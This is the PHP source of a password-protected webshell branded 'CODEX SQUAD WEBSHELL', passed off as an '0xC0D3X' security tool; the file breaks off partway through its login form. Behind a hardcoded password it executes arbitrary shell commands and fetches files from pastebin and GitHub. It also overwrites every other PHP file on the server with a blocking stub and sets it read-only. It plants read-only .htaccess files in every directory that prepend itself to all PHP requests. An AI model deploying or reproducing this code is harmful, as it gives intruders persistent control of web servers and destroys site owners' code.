<?php
// ============= SUPER MOD SECURITY BY 0xC0D3X =============
$SESSION_TIMEOUT = 1800; // Session timeout in seconds (30 minutes)

session_start();
ob_start();

// Default password - CHANGE THIS IN PRODUCTION!
$DEFAULT_PASSWORD = "GeoDevz69#";
$SECURITY_KEY = "0xC0D3X_" . md5($DEFAULT_PASSWORD);

// Get current script filename for protection
$current_script = basename(__FILE__);

// Check if user is logged in
$logged_in = isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;
$key_valid = isset($_SESSION['security_key']) && $_SESSION['security_key'] === $SECURITY_KEY;

// Handle logout
if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// Handle login
if (isset($_POST['password']) && !$logged_in) {
    if ($_POST['password'] === $DEFAULT_PASSWORD) {
        $_SESSION['logged_in'] = true;
        $_SESSION['security_key'] = $SECURITY_KEY;
        $_SESSION['login_time'] = time();
        $logged_in = true;
        $key_valid = true;
    } else {
        $login_error = "Invalid password!";
    }
}

// Handle GET KEY request
if (isset($_POST['get_key']) && isset($_POST['password'])) {
    if ($_POST['password'] === $DEFAULT_PASSWORD) {
        $key_display = $SECURITY_KEY;
    } else {
        $login_error = "Invalid password for key generation!";
    }
}

// Check session timeout
if ($logged_in && isset($_SESSION['login_time']) && (time() - $_SESSION['login_time']) > $SESSION_TIMEOUT) {
    session_destroy();
    $logged_in = false;
    $key_valid = false;
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// ============= ADVANCED PROTECTION FUNCTIONS =============

/**
 * Check if file is allowed (0xC0D3X files or index.php)
 */
function isAllowedFile($filename) {
    global $current_script;
    
    // Always allow the current script itself
    if ($filename === $current_script) {
        return true;
    }
    
    // Allow index.php
    if (strtolower($filename) === 'index.php') {
        return true;
    }
    
    $file_lower = strtolower($filename);
    
    // STRICT PATTERN: Must start with 0xc0d3x or codex/squad
    $allowed_patterns = [
        // Exact 0xC0D3X format with underscore
        '/^0xc0d3x_[a-z0-9_\-]+\.(php|txt|log|html|htm)$/',
        // Exact 0xC0D3X.php format
        '/^0xc0d3x\.php$/',
        // Codex Squad variations
        '/^codex_[a-z0-9_\-]+\.(php|txt|log)$/',
        '/^squad_[a-z0-9_\-]+\.(php|txt|log)$/',
        // Allow specific configuration files
        '/^config_[a-z0-9_\-]+\.php$/',
        '/^settings_[a-z0-9_\-]+\.php$/',
    ];
    
    foreach ($allowed_patterns as $pattern) {
        if (preg_match($pattern, $file_lower)) {
            return true;
        }
    }
    
    return false;
}

/**
 * Get all PHP file extensions (case-insensitive)
 */
function getPhpExtensions() {
    return [
        'php', 'phtml', 'phps', 'php3', 'php4', 'php5', 'php6', 'php7', 'php8', 
        'php9', 'inc', 'module', 'plugin', 'php2', 'php1', 'php0',
        // Case variations
        'PHP', 'Php', 'pHp', 'phP', 'PHp', 'pHP', 'PhP'
    ];
}

/**
 * Check if file is a PHP file (by extension or content)
 */
function isPhpFile($filename, $filepath = null) {
    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    $php_extensions = getPhpExtensions();
    
    // Check by extension
    if (in_array($ext, $php_extensions)) {
        return true;
    }
    
    // Additional check by file content (for obfuscated/misnamed files)
    if ($filepath && file_exists($filepath)) {
        $content = @file_get_contents($filepath, false, null, 0, 2048);
        if ($content) {
            // Check for PHP opening tags (including short tags)
            $php_indicators = [
                '<?php', '<?=', '<?', 
                '<script language="php">', 
                '<%', '<%=', 
                'phar://', 'php://'
            ];
            
            foreach ($php_indicators as $indicator) {
                if (stripos($content, $indicator) !== false) {
                    return true;
                }
            }
            
            // Check for common PHP functions
            $php_functions = [
                'eval(', 'base64_decode(', 'system(', 'shell_exec(',
                'exec(', 'passthru(', 'popen(', 'proc_open(',
                'assert(', 'create_function(', 'include(', 'require(',
                '$_GET[', '$_POST[', '$_REQUEST[', '$_COOKIE['
            ];
            
            foreach ($php_functions as $func) {
                if (stripos($content, $func) !== false) {
                    return true;
                }
            }
        }
    }
    
    return false;
}

/**
 * Block/Neutralize a malicious file
 */
function blockFile($filepath) {
    if (!file_exists($filepath)) {
        return false;
    }
    
    // Check if already blocked
    $content = @file_get_contents($filepath, false, null, 0, 200);
    $is_already_blocked = $content && (
        strpos($content, '💢 Unauthorized Access Denied 💢') !== false || 
        strpos($content, 'Blocked by 0xC0D3X') !== false ||
        strpos($content, '0xC0D3X PROTECTION SYSTEM') !== false
    );
    
    if ($is_already_blocked) {
        return true;
    }
    
    // Create blocking content
    $blocked_content = <<<'PHP'
<?php
// ============= 0xC0D3X PROTECTION SYSTEM =============
// This file has been automatically blocked by 0xC0D3X Security
// Original content has been neutralized to prevent malicious use

header('HTTP/1.1 403 Forbidden');
header('Content-Type: text/plain; charset=utf-8');

$client_ip = $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN';
$request_uri = $_SERVER['REQUEST_URI'] ?? 'UNKNOWN';
$timestamp = date('Y-m-d H:i:s');

$log_message = "[$timestamp] BLOCKED ACCESS - IP: $client_ip | URI: $request_uri | File: " . basename(__FILE__) . "\n";
@file_put_contents(dirname(__FILE__) . '/0xc0d3x_security.log', $log_message, FILE_APPEND);

die('💢 Unauthorized Access Denied 💢' . "\n" . 
    'This file has been blocked by 0xC0D3X Security System' . "\n" .
    'Timestamp: ' . $timestamp . "\n" .
    'Your IP: ' . $client_ip);
?>
PHP;

    // Write blocking content
    if (@file_put_contents($filepath, $blocked_content)) {
        @chmod($filepath, 0444); // Read-only
        return true;
    }
    
    return false;
}

/**
 * Continuous file monitoring and protection
 */
function runContinuousFileProtection() {
    global $current_script;
    static $last_run = 0;
    static $cache = [];
    
    // Run at most once per 0.5 seconds
    $current_time = microtime(true);
    if ($current_time - $last_run < 0.5) {
        return isset($cache['blocked_count']) ? $cache['blocked_count'] : 0;
    }
    
    $last_run = $current_time;
    $root_dir = dirname(__FILE__);
    $blocked_count = 0;
    $php_extensions = getPhpExtensions();
    
    // Fast directory scanning function
    function scanDirectoryRecursive($dir, &$results = []) {
        $files = @scandir($dir);
        if (!$files) return $results;
        
        foreach ($files as $value) {
            $path = $dir . DIRECTORY_SEPARATOR . $value;
            if (!is_readable($path)) continue;
            
            if (!in_array($value, ['.', '..', '.git', '.svn', '.hg', 'node_modules', 'vendor'])) {
                if (is_dir($path)) {
                    scanDirectoryRecursive($path, $results);
                } else {
                    $results[] = $path;
                }
            }
        }
        return $results;
    }
    
    // Get all files in the directory tree
    $all_files = scanDirectoryRecursive($root_dir);
    
    foreach ($all_files as $file_path) {
        $filename = basename($file_path);
        
        // Skip current script and index.php
        if ($filename === $current_script || strtolower($filename) === 'index.php') {
            continue;
        }
        
        // Check if it's a PHP file
        if (isPhpFile($filename, $file_path)) {
            // Check if it's an allowed file
            if (!isAllowedFile($filename)) {
                if (blockFile($file_path)) {
                    $blocked_count++;
                }
            }
        }
        
        // Also check for suspicious file names even with non-PHP extensions
        $suspicious_patterns = [
            '/shell/i', '/backdoor/i', '/wso/i', '/c99/i', '/r57/i', '/b374k/i',
            '/uploader/i', '/cmd/i', '/hack/i', '/exploit/i', '/malicious/i',
            '/webshell/i', '/cgi-?shell/i', '/browser/i', '/adminer/i',
            '/phpmyadmin/i', '/sqlmap/i', '/metasploit/i'
        ];
        
        foreach ($suspicious_patterns as $pattern) {
            if (preg_match($pattern, $filename)) {
                if (blockFile($file_path)) {
                    $blocked_count++;
                    break;
                }
            }
        }
    }
    
    // Cache the result
    $cache['blocked_count'] = $blocked_count;
    $cache['last_check'] = time();
    
    return $blocked_count;
}

/**
 * Advanced webshell detection
 */
function scanForWebshells() {
    global $current_script;
    $current_dir = dirname(__FILE__);
    $webshells_found = [];
    
    $webshell_patterns = [
        // PHP execution patterns
        '/eval\s*\(\s*(\$_(GET|POST|REQUEST|COOKIE|SERVER)|base64_decode|urldecode|str_rot13)/i',
        '/base64_decode\s*\(\s*(\$_(GET|POST|REQUEST|COOKIE)|\$_SERVER)/i',
        '/system\s*\(\s*(\$_(GET|POST|REQUEST|COOKIE)|\$_SERVER)/i',
        '/shell_exec\s*\(\s*(\$_(GET|POST|REQUEST|COOKIE)|\$_SERVER)/i',
        '/exec\s*\(\s*(\$_(GET|POST|REQUEST|COOKIE)|\$_SERVER)/i',
        '/passthru\s*\(\s*(\$_(GET|POST|REQUEST|COOKIE)|\$_SERVER)/i',
        '/assert\s*\(\s*(\$_(GET|POST|REQUEST|COOKIE)|\$_SERVER)/i',
        '/preg_replace\s*\(\s*["\']\/\.\*["\']/i',
        '/create_function\s*\(/i',
        
        // Dangerous includes
        '/include\s*\(\s*(\$_(GET|POST|REQUEST|COOKIE)|\$_SERVER)/i',
        '/require\s*\(\s*(\$_(GET|POST|REQUEST|COOKIE)|\$_SERVER)/i',
        '/include_once\s*\(\s*(\$_(GET|POST|REQUEST|COOKIE)|\$_SERVER)/i',
        '/require_once\s*\(\s*(\$_(GET|POST|REQUEST|COOKIE)|\$_SERVER)/i',
        
        // Obfuscation patterns
        '/gzuncompress\s*\(\s*base64_decode/i',
        '/gzinflate\s*\(\s*base64_decode/i',
        '/str_rot13\s*\(\s*base64_decode/i',
        
        // Command execution via backticks
        '/`\s*\$_(GET|POST|REQUEST|COOKIE)/i',
        
        // PHP tags in variables
        '/<\?php\s+\$_(GET|POST|REQUEST|COOKIE)/i',
        '/echo\s+\$_(GET|POST|REQUEST|COOKIE)\s*\[\s*["\']cmd["\']\s*\]/i',
        
        // File manipulation for malicious purposes
        '/fopen\s*\(\s*["\']\.\.\//i',
        '/file_put_contents\s*\(\s*["\'](\.php|\.phtml|\.phps)/i',
        
        // Network functions for reverse shells
        '/fsockopen\s*\(\s*\$_(GET|POST|REQUEST|COOKIE)/i',
        '/socket_create\s*\(\s*.*\)\s*;\s*socket_connect/i',
    ];
    
    $dangerous_extensions = array_merge(
        getPhpExtensions(),
        ['.pl', '.cgi', '.py', '.sh', '.rb', '.exe', '.bat', '.cmd', '.jar', '.war']
    );
    
    // Scan directory recursively
    $dir_iterator = new RecursiveDirectoryIterator($current_dir, RecursiveDirectoryIterator::SKIP_DOTS);
    $iterator = new RecursiveIteratorIterator($dir_iterator, RecursiveIteratorIterator::SELF_FIRST);
    
    foreach ($iterator as $file) {
        if ($file->isFile()) {
            $file_path = $file->getPathname();
            $filename = $file->getFilename();
            
            // Skip current script and index.php
            if ($filename === $current_script || strtolower($filename) === 'index.php') {
                continue;
            }
            
            $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
            $full_ext = '.' . $ext;
            
            if (in_array($full_ext, $dangerous_extensions) || isPhpFile($filename, $file_path)) {
                $content = @file_get_contents($file_path);
                if ($content) {
                    // Skip already blocked files
                    if (strpos($content, '💢 Unauthorized Access Denied 💢') !== false || 
                        strpos($content, '0xC0D3X PROTECTION SYSTEM') !== false) {
                        continue;
                    }
                    
                    $is_webshell = false;
                    
                    // Check patterns
                    foreach ($webshell_patterns as $pattern) {
                        if (preg_match($pattern, $content)) {
                            $is_webshell = true;
                            break;
                        }
                    }
                    
                    // Check for suspicious variable names
                    $suspicious_vars = ['password', 'passwd', 'pass', 'cmd', 'command', 'exec', 'shell', 'backdoor'];
                    foreach ($suspicious_vars as $var) {
                        if (preg_match('/\$_(' . strtoupper($var) . '|' . $var . ')/i', $content)) {
                            $is_webshell = true;
                            break;
                        }
                    }
                    
                    if ($is_webshell) {
                        $webshells_found[] = $file_path;
                        if (blockFile($file_path)) {
                            // Log the detection
                            $log_message = "[" . date('Y-m-d H:i:s') . "] WEBSHELL DETECTED AND BLOCKED: " . $file_path . "\n";
                            @file_put_contents(dirname(__FILE__) . '/0xc0d3x_security.log', $log_message, FILE_APPEND);
                        }
                    }
                }
            }
        }
    }
    
    return $webshells_found;
}

/**
 * Install global .htaccess protection
 */
function installGlobalProtection() {
    global $current_script;
    $root_dir = dirname(__FILE__);
    
    // Enhanced .htaccess content
    $htaccess_content = <<<HTACCESS
# ============= 0xC0D3X GLOBAL PROTECTION =============
# Auto-generated by 0xC0D3X Security System

# Force PHP auto-prepend for all PHP files
<FilesMatch "\.(php|phtml|phps|php[0-9]*|inc|module|plugin)$">
    php_value auto_prepend_file "{$root_dir}/{$current_script}"
</FilesMatch>

# Block dangerous file extensions
<FilesMatch "\.(htaccess|htpasswd|ini|log|sh|bak|sql|tar|gz|zip|rar|exe|bat|cmd)$">
    Order allow,deny
    Deny from all
</FilesMatch>

# Block common webshell names
<FilesMatch "(wso|shell|backdoor|c99|r57|b374k|uploader|cmd)\.(php|phtml|phps)$">
    Order allow,deny
    Deny from all
</FilesMatch>

# Prevent directory listing
Options -Indexes

# Security headers
<IfModule mod_headers.c>
    Header set X-Content-Type-Options nosniff
    Header set X-Frame-Options DENY
    Header set X-XSS-Protection "1; mode=block"
</IfModule>

# Disable PHP execution in upload directories (common pattern)
<IfModule mod_rewrite.c>
    RewriteEngine On
    RewriteRule ^(uploads|images|files|tmp)/.*\.(php|phtml|phps|php[0-9]*)$ - [F,NC]
</IfModule>
HTACCESS;
    
    // Install .htaccess in all directories
    $dir_iterator = new RecursiveDirectoryIterator($root_dir, RecursiveDirectoryIterator::SKIP_DOTS);
    $iterator = new RecursiveIteratorIterator($dir_iterator, RecursiveIteratorIterator::SELF_FIRST);
    
    $installed_count = 0;
    foreach ($iterator as $file) {
        if ($file->isDir()) {
            $htaccess_file = $file->getPathname() . '/.htaccess';
            if (@file_put_contents($htaccess_file, $htaccess_content)) {
                @chmod($htaccess_file, 0444);
                $installed_count++;
            }
        }
    }
    
    // Also in root directory
    @file_put_contents($root_dir . '/.htaccess', $htaccess_content);
    @chmod($root_dir . '/.htaccess', 0444);
    $installed_count++;
    
    return $installed_count;
}

/**
 * Global protection interceptor - runs on every request
 */
function globalProtectionInterceptor() {
    global $current_script;
    
    // Get the actual executing script
    if (isset($_SERVER['SCRIPT_FILENAME'])) {
        $executing_script = basename($_SERVER['SCRIPT_FILENAME']);
    } elseif (isset($_SERVER['PHP_SELF'])) {
        $executing_script = basename($_SERVER['PHP_SELF']);
    } else {
        $executing_script = 'unknown';
    }
    
    // Skip if it's our main script or index.php
    if ($executing_script === $current_script || strtolower($executing_script) === 'index.php') {
        return;
    }
    
    // Check if file is NOT an allowed file
    if (!isAllowedFile($executing_script)) {
        // Check if it's a PHP file
        $script_path = isset($_SERVER['SCRIPT_FILENAME']) ? $_SERVER['SCRIPT_FILENAME'] : '';
        if ($script_path && file_exists($script_path) && isPhpFile($executing_script, $script_path)) {
            // Block the file
            if (blockFile($script_path)) {
                // Log the block
                $log_message = "[" . date('Y-m-d H:i:s') . "] REAL-TIME BLOCK: " . $script_path . " | IP: " . ($_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN') . "\n";
                @file_put_contents(dirname(__FILE__) . '/0xc0d3x_security.log', $log_message, FILE_APPEND);
            }
        }
        
        // Block access
        header('HTTP/1.1 403 Forbidden');
        header('Content-Type: text/plain; charset=utf-8');
        die('💢 Unauthorized Access Denied 💢' . "\n" . 
            'This file has been blocked by 0xC0D3X Security System' . "\n" .
            'Timestamp: ' . date('Y-m-d H:i:s') . "\n" .
            'Your IP: ' . ($_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN'));
    }
}

/**
 * Initialize protection system
 */
function initializeProtection() {
    // Create security log if it doesn't exist
    $log_file = dirname(__FILE__) . '/0xc0d3x_security.log';
    if (!file_exists($log_file)) {
        $log_header = "=== 0xC0D3X SECURITY LOG ===\n";
        $log_header .= "Created: " . date('Y-m-d H:i:s') . "\n";
        $log_header .= "System initialized\n";
        $log_header .= str_repeat("=", 40) . "\n\n";
        @file_put_contents($log_file, $log_header);
        @chmod($log_file, 0600);
    }
    
    // Run initial scan
    runContinuousFileProtection();
}

/**
 * Safe command execution with wget support
 */
function executeSafeCommand($command) {
    global $current_script;
    
    // Trim and clean the command
    $command = trim($command);
    if (empty($command)) {
        return ["No command provided"];
    }
    
    // Get allowed wget URLs (whitelist for security)
    $allowed_domains = [
        'github.com', 'raw.githubusercontent.com', 'pastebin.com', 'gist.githubusercontent.com',
        'gitlab.com', 'bitbucket.org'
    ];
    
    // Dangerous patterns that should be blocked
    $dangerous_patterns = [
        // Self-destruction patterns
        '/rm\s+.*' . preg_quote($current_script, '/') . '/i',
        '/unlink\s*\(.*' . preg_quote($current_script, '/') . '/i',
        '/file_put_contents\s*\(.*' . preg_quote($current_script, '/') . '/i',
        
        // Dangerous system commands
        '/rm\s+-rf\s+\/\s*$/',
        '/rm\s+-rf\s+\.\.\/\.\.\//',
        '/dd\s+if=/',
        '/mkfs/',
        '/fdisk/',
        
        // PHP execution strings
        '/php\s+-r\s+/i',
        '/echo\s+.*<\?php/i',
        
        // Network abuse
        '/nc\s+.*-e\s+/i',
        '/bash\s+-i\s+>/',
        '/nmap/',
        '/hydra/',
        
        // Excessive file operations
        '/find\s+.*-exec\s+rm/i',
        '/chmod\s+777\s+/',
        '/chown\s+-R/',
    ];
    
    // Check for dangerous patterns
    foreach ($dangerous_patterns as $pattern) {
        if (preg_match($pattern, $command)) {
            return ["COMMAND BLOCKED: Security restriction - Dangerous pattern detected"];
        }
    }
    
    // Check for wget/curl commands specifically
    if (preg_match('/^(wget|curl)\s+/i', $command)) {
        // Extract URL from command
        $url_pattern = '/https?:\/\/[^\s<>"\']+/i';
        preg_match($url_pattern, $command, $url_matches);
        
        if (!empty($url_matches)) {
            $url = $url_matches[0];
            $domain = parse_url($url, PHP_URL_HOST);
            
            // Check if domain is allowed
            $domain_allowed = false;
            foreach ($allowed_domains as $allowed_domain) {
                if (strpos($domain, $allowed_domain) !== false) {
                    $domain_allowed = true;
                    break;
                }
            }
            
            if (!$domain_allowed) {
                return ["COMMAND BLOCKED: Domain not allowed for wget/curl: $domain"];
            }
            
            // Check for dangerous file extensions in wget output
            $dangerous_extensions = [
                '\.php', '\.phtml', '\.phps', '\.php\d+', '\.inc',
                '\.sh', '\.pl', '\.py', '\.rb', '\.exe', '\.bat', '\.cmd'
            ];
            
            $extension_pattern = '/\.(' . implode('|', $dangerous_extensions) . ')(\?|$)/i';
            
            // Check output file in wget command
            if (preg_match('/-O\s+([^\s]+)/i', $command, $output_matches)) {
                $output_file = $output_matches[1];
                if (preg_match($extension_pattern, $output_file)) {
                    // But allow 0xC0D3X.php files
                    if (!preg_match('/0xc0d3x\.php$/i', $output_file)) {
                        return ["COMMAND BLOCKED: Cannot download dangerous file types"];
                    }
                }
            }
        }
    }
    
    // Limit command length
    if (strlen($command) > 500) {
        return ["COMMAND BLOCKED: Command too long (max 500 characters)"];
    }
    
    // Execute the command
    $output = [];
    $return_var = 0;
    
    // Set execution time limit
    set_time_limit(10);
    
    // Execute command
    exec($command . ' 2>&1', $output, $return_var);
    
    // If command executed successfully and was a wget for 0xC0D3X.php,
    // run immediate protection scan on the downloaded file
    if ($return_var === 0 && preg_match('/wget.*0xc0d3x\.php/i', $command)) {
        // Extract output file path
        if (preg_match('/-O\s+([^\s]+)/i', $command, $matches)) {
            $downloaded_file = $matches[1];
            if (file_exists($downloaded_file)) {
                // Run protection on the downloaded file
                runContinuousFileProtection();
                $output[] = "\n✓ 0xC0D3X Protection: Downloaded file secured";
            }
        }
    }
    
    return $output;
}

// ============= MAIN PROTECTION EXECUTION =============
// Initialize protection system
initializeProtection();

// Run global protection on EVERY request
globalProtectionInterceptor();

// Run CONTINUOUS file protection on EVERY request
$blocked_files = runContinuousFileProtection();

// Install global protection if requested
if ($logged_in && isset($_GET['install'])) {
    $installed_count = installGlobalProtection();
    $install_success = "Global protection installed in $installed_count directories";
}

// Run webshell scan only when logged in
if ($logged_in) {
    $detected_webshells = scanForWebshells();
} else {
    $detected_webshells = [];
}

// Continue with the rest of your HTML/PHP code...
ob_end_flush();
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>0xC0D3X Mobile</title>
    <style>
        /* [KEEP ALL YOUR EXISTING CSS STYLES HERE - NO CHANGES] */
        /* MOBILE PORTRAIT ONLY UI */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoo UI', Roboto, Oxygen, Ubuntu, sans-serif;
            background: #f0f0f0;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 15px;
            color: #333;
            touch-action: manipulation;
            overflow-x: hidden;
        }
        
        /* Force portrait orientation */
        @media screen and (min-width: 600px) {
            body::before {
                content: "Please rotate your device to portrait mode";
                position: fixed;
                top: 0;
                left: 0;
                right: 0;
                bottom: 0;
                background: #f0f0f0;
                display: flex;
                justify-content: center;
                align-items: center;
                font-size: 20px;
                font-weight: bold;
                color: #333;
                text-align: center;
                padding: 20px;
                z-index: 9999;
            }
        }
        
        .neumorphic-container {
            background: #f0f0f0;
            border-radius: 20px;
            padding: 15px;
            box-shadow: 
                12px 12px 24px #d9d9d9,
                -12px -12px 24px #ffffff;
            width: 100%;
            max-width: 100%;
            border: 1px solid rgba(255, 255, 255, 0.5);
            position: relative;
            overflow: hidden;
            margin: auto;
        }
        
        .neumorphic-container::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 3px;
            background: linear-gradient(90deg, #f0f0f0, rgba(0,0,0,0.1), #f0f0f0);
        }
        
        .header {
            text-align: center;
            margin-bottom: 20px;
            padding-bottom: 15px;
            border-bottom: 2px solid rgba(0, 0, 0, 0.08);
        }
        
        .title {
            color: #333;
            font-size: 1.5em;
            font-weight: 900;
            letter-spacing: 0.5px;
            margin-bottom: 5px;
            text-transform: uppercase;
        }
        
        .subtitle {
            color: #666;
            font-size: 0.85em;
            font-weight: 400;
            letter-spacing: 0.3px;
        }
        
        .login-container, .command-interface {
            background: #f0f0f0;
            border-radius: 15px;
            padding: 15px;
            margin-bottom: 15px;
            box-shadow: 
                inset 4px 4px 8px #e0e0e0,
                inset -4px -4px 8px #ffffff;
            border: 1px solid rgba(255, 255, 255, 0.5);
        }
        
        .form-group {
            margin-bottom: 15px;
        }
        
        .form-label {
            display: block;
            margin-bottom: 8px;
            color: #333;
            font-weight: 700;
            font-size: 0.95em;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        
        .form-input, .command-input {
            width: 100%;
            padding: 12px 15px;
            border: none;
            border-radius: 12px;
            background: #f0f0f0;
            box-shadow: 
                inset 4px 4px 8px #e0e0e0,
                inset -4px -4px 8px #ffffff;
            font-size: 1em;
            color: #333;
            transition: all 0.2s ease;
            -webkit-appearance: none;
            appearance: none;
            font-family: inherit;
        }
        
        .form-input:focus, .command-input:focus {
            outline: none;
            box-shadow: 
                inset 3px 3px 6px #e0e0e0,
                inset -3px -3px 6px #ffffff;
        }
        
        .button-group {
            display: flex;
            flex-direction: column;
            gap: 10px;
            width: 100%;
        }
        
        .row-buttons {
            display: flex;
            gap: 10px;
            width: 100%;
        }
        
        .neumorphic-button {
            flex: 1;
            padding: 14px 10px;
            border: none;
            border-radius: 12px;
            font-size: 0.95em;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.2s ease;
            text-transform: uppercase;
            letter-spacing: 0.8px;
            background: #f0f0f0;
            color: #333;
            box-shadow: 
                6px 6px 12px #e0e0e0,
                -6px -6px 12px #ffffff;
            position: relative;
            overflow: hidden;
            min-height: 50px;
            display: flex;
            align-items: center;
            justify-content: center;
            user-select: none;
            text-align: center;
        }
        
        .neumorphic-button::after {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(255, 255, 255, 0.1);
            opacity: 0;
            transition: opacity 0.2s;
        }
        
        .neumorphic-button:active::after {
            opacity: 1;
        }
        
        .neumorphic-button:active {
            transform: translateY(1px);
            box-shadow: 
                inset 3px 3px 6px #e0e0e0,
                inset -3px -3px 6px #ffffff;
        }
        
        .alert {
            padding: 12px;
            border-radius: 12px;
            margin-bottom: 15px;
            text-align: center;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            box-shadow: 
                6px 6px 12px #e0e0e0,
                -6px -6px 12px #ffffff;
            border: 1px solid rgba(255, 255, 255, 0.5);
            font-size: 0.9em;
        }
        
        .alert-danger {
            background: #f0f0f0;
            color: #ff4444;
            border-color: rgba(255, 68, 68, 0.3);
        }
        
        .alert-success {
            background: #f0f0f0;
            color: #00aa00;
            border-color: rgba(0, 170, 0, 0.3);
        }
        
        .alert-info {
            background: #f0f0f0;
            color: #0066cc;
            border-color: rgba(0, 102, 204, 0.3);
        }
        
        .key-display {
            background: #f0f0f0;
            border-radius: 12px;
            padding: 12px;
            margin-top: 15px;
            font-family: 'Courier New', monospace;
            word-break: break-all;
            box-shadow: 
                inset 3px 3px 6px #e0e0e0,
                inset -3px -3px 6px #ffffff;
            border: 1px solid rgba(255, 255, 255, 0.5);
            font-size: 0.85em;
        }
        
        .command-form {
            margin-bottom: 15px;
        }
        
        .output-container {
            background: #1a1a1a;
            border-radius: 12px;
            padding: 15px;
            margin-top: 15px;
            max-height: 300px;
            overflow-y: auto;
            box-shadow: 
                inset 3px 3px 6px #000000,
                inset -3px -3px 6px #333333;
            border: 1px solid #333;
            -webkit-overflow-scrolling: touch;
        }
        
        pre {
            color: #00ff00;
            font-family: 'Courier New', monospace;
            font-size: 0.85em;
            line-height: 1.4;
            white-space: pre-wrap;
            word-wrap: break-word;
        }
        
        .info-panel {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 10px;
            margin-top: 15px;
            padding-top: 15px;
            border-top: 2px solid rgba(0, 0, 0, 0.08);
        }
        
        .info-box {
            background: #f0f0f0;
            border-radius: 12px;
            padding: 12px;
            text-align: center;
            box-shadow: 
                4px 4px 8px #e0e0e0,
                -4px -4px 8px #ffffff;
            transition: all 0.2s ease;
            border: 1px solid rgba(255, 255, 255, 0.5);
        }
        
        .info-box:active {
            transform: translateY(1px);
            box-shadow: 
                inset 3px 3px 6px #e0e0e0,
                inset -3px -3px 6px #ffffff;
        }
        
        .info-label {
            font-size: 0.75em;
            color: #666;
            margin-bottom: 5px;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        
        .info-value {
            font-size: 1em;
            font-weight: 800;
            color: #333;
        }
        
        .footer {
            text-align: center;
            margin-top: 15px;
            padding-top: 15px;
            border-top: 2px solid rgba(0, 0, 0, 0.08);
            color: #666;
            font-size: 0.75em;
            line-height: 1.4;
        }
        
        .install-button {
            width: 100%;
            margin-top: 10px;
        }
        
        /* Mobile optimizations */
        @media (max-width: 360px) {
            .title {
                font-size: 1.3em;
            }
            
            .neumorphic-container {
                padding: 10px;
                border-radius: 15px;
            }
            
            .login-container, .command-interface {
                padding: 12px;
                border-radius: 12px;
            }
            
            .neumorphic-button {
                padding: 12px 8px;
                font-size: 0.9em;
                min-height: 45px;
            }
            
            .info-panel {
                grid-template-columns: 1fr;
                gap: 8px;
            }
            
            .form-input, .command-input {
                padding: 10px 12px;
                font-size: 0.95em;
            }
        }
        
        /* Prevent landscape mode */
        @media (orientation: landscape) {
            body::before {
                content: "Please rotate your device to portrait mode for best experience";
                position: fixed;
                top: 0;
                left: 0;
                right: 0;
                bottom: 0;
                background: #f0f0f0;
                display: flex;
                justify-content: center;
                align-items: center;
                font-size: 18px;
                font-weight: bold;
                color: #333;
                text-align: center;
                padding: 20px;
                z-index: 9999;
            }
            
            .neumorphic-container {
                opacity: 0.3;
                pointer-events: none;
            }
        }
        
        /* Touch optimizations */
        .neumorphic-button {
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none;
        }
        
        input, textarea, button {
            font-size: 16px; /* Prevent zoom on iOS */
        }
        
        /* Hide scrollbars but keep functionality */
        .output-container::-webkit-scrollbar {
            width: 4px;
        }
        
        .output-container::-webkit-scrollbar-track {
            background: #1a1a1a;
        }
        
        .output-container::-webkit-scrollbar-thumb {
            background: #00ff00;
            border-radius: 2px;
        }
        
        /* Button styling for specific buttons */
        .get-key-btn {
            order: 1;
        }
        
        .login-btn {
            order: 2;
        }
        
        .execute-btn {
            order: 1;
        }
        
        .logout-btn {
            order: 2;
        }
        
        /* Ensure all content fits portrait */
        @media (max-height: 700px) {
            .neumorphic-container {
                padding: 10px;
                margin: 5px;
            }
            
            .header {
                margin-bottom: 10px;
            }
            
            .login-container, .command-interface {
                margin-bottom: 10px;
            }
            
            .output-container {
                max-height: 200px;
            }
        }
        
        @media (max-height: 600px) {
            .output-container {
                max-height: 150px;
            }
            
            .info-panel {
                margin-top: 10px;
                padding-top: 10px;
            }
        }
    </style>
</head>
<body>
    <div class="neumorphic-container">
        <div class="header">
            <h4 class="title">CODEX SQUAD WEBSHELL</h4>
            <p class="subtitle">SECURITY IS JUST AN ILLUSION</p>
        </div>
        
        <?php if (!$logged_in || !$key_valid): ?>
            <!-- Login Form -->
            <div class="login-container">
                <?php if (isset($login_error)): ?>
                    <div class="alert alert-danger">
                        <?php echo htmlspecialchars($login_error); ?>
                    </div>
                <?php endif; ?>
                
                <?php if (isset($key_display)): ?>
                    <div class="alert alert-success">
                        SECURITY KEY GENERATED
                    </div>
                    <div class="key-display">
                        <strong>SECURITY KEY:</strong><br>
                        <?php echo htmlspecialchars($key_display); ?>
                    </div>
                <?php endif; ?>
                
                <form method="POST" action="">
                    <div class="form-group">
                        <label class="form-label" for="password">AUTHORIZED ACCESS ONLY</label>
                        <input type="password" 
                               id="password" 
                               name="password" 
                               class="form-input" 
                               placeholder="ENTER PASSWORD" 
                               required>
                    </div>
                    
                    <div class="button-group">
                        <div class="row-buttons">
                            <!-- GET KEY on LEFT, LOGIN on RIGHT -->
